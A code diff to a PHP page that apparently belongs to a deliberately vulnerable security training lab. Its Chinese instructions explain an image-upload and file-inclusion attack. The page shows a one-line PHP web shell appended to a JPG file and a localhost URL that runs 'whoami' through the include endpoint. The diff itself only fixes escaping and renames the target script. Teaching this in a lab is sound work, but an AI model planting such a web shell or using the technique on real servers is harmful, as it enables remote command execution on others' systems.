@@ -108,7 +108,7 @@ $content = '<div class="card">
                     <ol>
                         <li>准备一张正常的图片文件，例如：<code>test.jpg</code></li>
                         <li>使用文本编辑器打开图片文件，在文件末尾添加PHP代码：</li>
-                        <pre class="bg-dark text-light p-3 rounded"><code>&lt;?php system($_GET[\'cmd\']); ?&gt;</code></pre>
+                        <pre class="bg-dark text-light p-3 rounded"><code>&lt;?php system($_GET['cmd']); ?&gt;</code></pre>
                         <li>保存文件，保持扩展名不变（如：<code>test.jpg</code>）</li>
                     </ol>
 
@@ -120,7 +120,7 @@ $content = '<div class="card">
 
                     <h5 class="mb-2 mt-4">步骤3：通过文件包含执行代码</h5>
                     <ol>
-                        <li>在浏览器中访问：<code>http://localhost/zhaosec/upload/image_include.php?file=uploads/test.jpg&cmd=whoami</code></li>
+                        <li>在浏览器中访问：<code>http://localhost/zhaosec/upload/05_image_include.php?file=uploads/test.jpg&cmd=whoami</code></li>
                         <li>将<code>uploads/test.jpg</code>替换为实际的上传路径</li>
                         <li>查看执行结果，应该显示当前系统用户</li>
                     </ol>
@@ -161,7 +161,7 @@ if ($message) {
                         <p>' . htmlspecialchars($message) . '</p>';
         if ($uploaded_file) {
             $content .= '<p>上传文件路径：<code>' . htmlspecialchars($uploaded_file) . '</code></p>';
-            $content .= '<p>包含测试链接：<a href="image_include.php?file=' . htmlspecialchars($uploaded_file) . '&cmd=whoami" target="_blank">点击测试</a></p>';
+            $content .= '<p>包含测试链接：<a href="05_image_include.php?file=' . htmlspecialchars($uploaded_file) . '&cmd=whoami" target="_blank">点击测试</a></p>';
         }
         $content .= '</div>';
     } else {
